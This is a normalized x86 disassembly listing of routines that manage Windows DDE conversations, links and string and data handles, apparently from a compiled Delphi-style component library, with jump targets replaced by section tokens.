jmp r-xdata
mov eax edi
mov si 0xffef
call sub_403454
movzx ebp bx
mov esi [ edi + 0x9c ]
cmp ebp [ esi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax esi
call sub_4137ac
call sub_45ff98
inc ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45f884
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov [ esp ] edx
mov esi eax
xor ebx ebx
jmp r-xdata
movzx eax bx
mov ebp [ esi + 0x9c ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
movzx edx bx
mov eax ebp
call sub_4137ac
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
call sub_45fd4c
cmp edi [ eax + 0x8 ]
jne r-xdata
inc ebx
sub_45f8c4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc5 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov [ esi + 0xc5 ] bl
mov eax [ esi + 0x30 ]
call sub_404250
test eax eax
je r-xdata
mov eax [ esi + 0x34 ]
call sub_404250
test eax eax
je r-xdata
mov eax esi
call sub_45f4ac
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
sub_45f9ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov ebx eax
mov cl [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_419468
cmp [ esp + 0x4 ] 0x1
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x9c ] 0x0
je r-xdata
xor esi esi
jmp r-xdata
movzx edi si
mov ebp [ ebx + 0x9c ]
cmp edi [ ebp + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebp
call sub_4137ac
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ ebx + 0x9c ]
cmp edi [ eax + 0x8 ]
jge r-xdata
mov eax edx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_45fb1c
inc esi
sub_45fa20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41914c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_45fa64
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_45fa94
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403994#7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x34 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fb16
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x38 ]
call sub_404028
lea eax [ ebx + 0x38 ]
call sub_403f90
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x34 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_45f354
mov edx ebx
call sub_41921c
mov eax [ ebp - 0x4 ]
call sub_404250
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45fb1c
sub_45fb1c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_403fe4
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x34 ]
call sub_45f38c
test al al
jne r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_403fe4
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
call sub_403f90
pop esi
pop ebx
retn
mov eax [ ebx + 0x34 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
cmp [ eax + 0xc5 ] 0x1
je r-xdata
sub_45fb78
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419468
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x34 ]
jne r-xdata
mov edx edi
mov eax [ edi + 0x34 ]
call sub_45f354
xor eax eax
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x38 ]
call sub_403f90
sub_45fbb4
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_40346c
test al al
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_45fbfc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_403f90
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_45fc30
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
xor eax eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_45fc74
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_45ff58
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413d24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_45fca0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45fd3d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404028
cmp [ esi + 0x8 ] 0x0
je r-xdata
lea eax [ esi + 0x4 ]
mov edx edi
call sub_403fe4
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x4 ]
call sub_404250
test eax eax
je r-xdata
mov eax esi
call sub_45ff58
mov eax esi
call sub_45fe28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fd44
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax [ esi + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ eax + 0xc5 ] 0x1
jne r-xdata
mov eax esi
call sub_45fea0
mov ebx eax
test bl bl
jne r-xdata
mov bl 0x1
lea eax [ esi + 0x4 ]
call sub_403f90
jmp r-xdata
sub_45fd4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403994#6
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_45fe90
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_404188
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_45fe28
jmp r-xdata
mov eax ebx
call sub_45ffb8
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax ebx
call sub_45fe98
mov eax [ ebx + 0xc ]
cmp [ eax + 0xc7 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fe20
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov eax [ ebp - 0x8 ]
call sub_404250
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov esi 0x1
inc esi
dec edi
jne r-xdata
cmp al 0x20
jae r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + esi - 0x1 ]
test al al
jbe r-xdata
lea eax [ ebp - 0x8 ]
call j_sub_40445c
mov [ eax + esi - 0x1 ] 0x20
sub_45fe28
push ebx
push esi
push edi
push ecx
mov edi eax
xor ebx ebx
mov eax [ edi + 0xc ]
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
mov eax edi
call sub_45ffb8
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0xc6 ] 0x1
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x3e8
push 0x20b0
mov eax [ eax + 0xa8 ]
push eax
mov eax [ edi + 0x8 ]
push eax
push edx
push 0xffffffff
push 0x0
call DdeClientTransaction
mov esi eax
test esi esi
je r-xdata
mov edx esi
mov eax edi
call sub_45fd4c
push esi
call DdeFreeDataHandle
mov bl 0x1
jmp r-xdata
sub_45fea0
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] 0x0
mov eax [ ebx + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax [ ebx + 0x4 ]
call sub_404250
test eax eax
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
push 0x3e8
push 0x1034
mov eax [ ebx + 0xc ]
mov edx [ eax + 0xa8 ]
push edx
mov edx [ ebx + 0x8 ]
push edx
mov eax [ eax + 0x38 ]
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
test eax eax
jne r-xdata
push 0x3ec
mov eax [ ebx + 0x4 ]
call sub_404450
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x8 ] eax
mov [ esp ] 0x1
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_45ff58
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax ebx
call sub_45ff98
mov al 0x1
pop edx
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
test edx edx
je r-xdata
push esp
push 0x3e8
push 0x8040
mov ecx [ esi + 0xa8 ]
push ecx
push edx
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
sub_45ff98
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
sub_45ffc4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41914c
mov [ esi + 0x48 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_460010
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_460050
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_403f90
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46007c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x48 ] 0x1
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_46012c
pop esi
pop ebx
retn
sub_4600a8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403994#5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
pop edx
call sub_407bac
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460123
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
mov [ ebx + 0x48 ] 0x1
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_46012c
sub_46012c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4601b3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3a ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_45ef90
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4601ba
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_438a40
mov edx [ ebp - 0x4 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_45ef90
sub_4601c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403994#4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push edi
call DdeAccessData
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46024a
lea eax [ ebp - 0xc ]
call sub_403f90
retn
lea eax [ ebp - 0xc ]
mov edx esi
call sub_404188
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
push edi
call DdeUnaccessData
mov eax ebx
call sub_46012c
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x8000
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_460268
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419468
cmp esi [ edi + 0x34 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x34 ] eax
sub_460290
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41914c
mov edx esi
mov eax [ rw-data ]
call sub_45eff4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_4602d4
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45f008
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_460308
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push j_sub_403994#3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
lea eax [ ebp - 0x4 ]
push eax
push edx
call DdeAccessData
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46039a
lea eax [ ebp - 0xc ]
call sub_403f90
retn
cmp [ esi + 0x42 ] 0x0
je r-xdata
mov edi 0x8000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404188
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ esi + 0x44 ]
call [ esi + 0x40 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4603cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41914c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_460410
push ebx
push esi
push edi
push ebp
call sub_4035cc
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x34 ]
test eax eax
je r-xdata
push eax
call DdeDisconnect
mov eax [ ebp + 0x44 ]
call sub_403258
xor eax eax
mov [ ebp + 0x44 ] eax
inc esi
xor edi edi
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_419198
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebp + 0x34 ] eax
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_4137ac
call sub_403258
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035b4
sub_460494
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x1008 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_4605b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4605bb
lea eax [ ebp - 0x100c ]
mov edx 0x2
call sub_403fb4
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1001 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1008 ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_404200
mov eax [ ebp - 0x1008 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_4607e0
mov edi eax
test edi edi
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_460958
mov esi eax
mov [ esi + 0x3c ] edi
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_404200
mov edx [ ebp - 0x100c ]
mov eax esi
call sub_460ab4
mov edx esi
mov eax [ ebx + 0x44 ]
call sub_413650
mov edx ebx
mov eax esi
call sub_41921c
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_404450
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x34 ] eax
sub_4605c8
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_460904
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx ebx
mov eax [ esi + 0x44 ]
call sub_4138f0
mov eax ebx
call sub_403258
sub_4605f8
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1004 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_46069b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4606a2
lea eax [ ebp - 0x1004 ]
call sub_403f90
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1000 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1004 ]
lea edx [ ebp - 0x1000 ]
mov ecx 0x1000
call sub_404200
mov eax [ ebp - 0x1004 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_4607e0
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
call sub_4601c0
mov esi eax
sub_4606ac
push ebp
mov ebp esp
xor edx edx
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
mov eax edx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov eax ecx
call sub_460308
mov edx eax
sub_4606cc
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push j_sub_403994#2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax ebx
call sub_460904
test eax eax
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1008 ]
mov ecx 0x1000
call sub_404200
mov eax [ ebp - 0x100c ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_4607e0
mov ebx eax
test ebx ebx
je r-xdata
mov dx [ ebp + 0x8 ]
call sub_4609d0
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4607d4
lea eax [ ebp - 0x100c ]
call sub_403f90
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
mov eax [ ebp - 0x8 ]
call sub_404250
inc eax
push eax
mov eax [ ebp - 0x8 ]
call sub_404450
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov [ ebp - 0x4 ] eax
sub_4607e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov edi edx
test edi edi
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
call sub_419770
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_40439c
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x4 ]
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4607e0
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_419744
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
sub_4608b4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_4137ac
mov ebx eax
mov eax [ ebx + 0x34 ]
mov edx [ esp ]
call sub_40439c
jne r-xdata
sub_460904
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_4137ac
mov ebx eax
mov eax [ esp ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call DdeCmpStringHandles
test eax eax
jne r-xdata
sub_460958
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x30 ] ecx
xor edx edx
mov eax esi
call sub_41914c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_460990
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419198
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ esi + 0x38 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_4609d0
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403994
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1004 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1004 ]
lea eax [ ebx + 0x34 ]
call sub_404080
cmp si 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460a8c
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
